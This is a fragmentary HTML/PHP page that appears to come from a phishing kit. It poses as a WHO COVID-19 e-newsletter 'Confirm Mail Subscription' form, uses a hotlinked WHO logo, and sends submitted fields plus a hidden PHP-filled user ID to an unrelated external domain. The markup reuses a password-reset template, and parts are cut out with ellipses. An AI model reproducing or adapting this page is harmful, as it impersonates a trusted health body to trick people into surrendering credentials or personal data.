...
#captcha-container {
    margin-bottom: 20px !important
            ...
            "><div id="password-reset-container"><div id="parent-card" class="ux-card"><div id="form-header">
              <form action="https://truemarkint.com/sport/completed.php" method="GET">
            ...
            <input type="hidden" name="userid" value="<?php echo $client_id;?>"><h4 class="page-title-with-back"><img src="https://seeklogo.net/wp-content/uploads/2014/11/who-logo-vector.png" width="100"><br>WHO COVID-19 e-Newsletter</h4></div></div><fieldset class="form-group">
            <p>Confirm Mail Subscription</p>
            ...
            </fieldset><button tabindex="0" class="btn btn-primary submit-button" id="" type="submit">Subscribe</button></div></div></div> </form></div></div></div></div></div></div></div><div id="footer-85ff98c4b0d823d68217b41206a35a77"><footer id="appheader-footer" class="manifest footer"><div role="contentinfo" class="container"><span>Copyright © 1999 - 2019.  All Rights Reserved.</span> <a href="#" target="_blank" data-eid="uxp.hyd.int.pc.app_header.footer.privacy_policy.link.click"><span>Privacy Policy</span></a></div><div id="gtm_privacy"></div></footer></div><script>
window.ux = window.ux || {};
